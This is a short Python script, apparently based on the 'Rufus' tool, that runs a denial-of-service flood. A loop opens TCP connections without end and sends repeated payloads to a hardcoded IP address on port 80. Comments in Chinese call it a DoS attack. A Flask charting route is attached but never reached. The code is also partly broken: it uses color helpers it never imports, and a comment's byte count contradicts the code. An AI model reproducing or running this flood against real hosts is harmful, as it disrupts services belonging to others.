import socket
import matplotlib.pyplot as plt
from flask import Flask, render_template

app = Flask(__name__)

traffic = []  # 儲存流量數據

@app.route('/')
def index():
    return render_template('chart.html')

def _dos(ip: str, port: int):
    global n

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            addr = (ip, port)
            sock.connect_ex(addr)
            print(Colorate.Horizontal(Colors.blue_to_red, f"Initializing connection number {n}..."))
            n += 1
            sock.send(b'Rufus Here -> https://github.com/billythegoat356/Rufus\n'*2004)
            print(Colorate.Horizontal(Colors.blue_to_red, f"Sending 2004 bytes to {ip}:{port}..."))

            # 記錄流量數據
            traffic.append(n * 2004)  # 假設每次傳送 1024 個字節

        except:
            print(Colorate.Horizontal(Colors.red_to_blue, "Error! Connection refused."))


if __name__ == '__main__':
    ip = "61.218.242.179"  # 設定目標 IP 位址
    port = 80  # 設定目標端口
    n = 0  # 初始化連接數
    _dos(ip, port)  # 開始 DoS 攻擊

    app.run()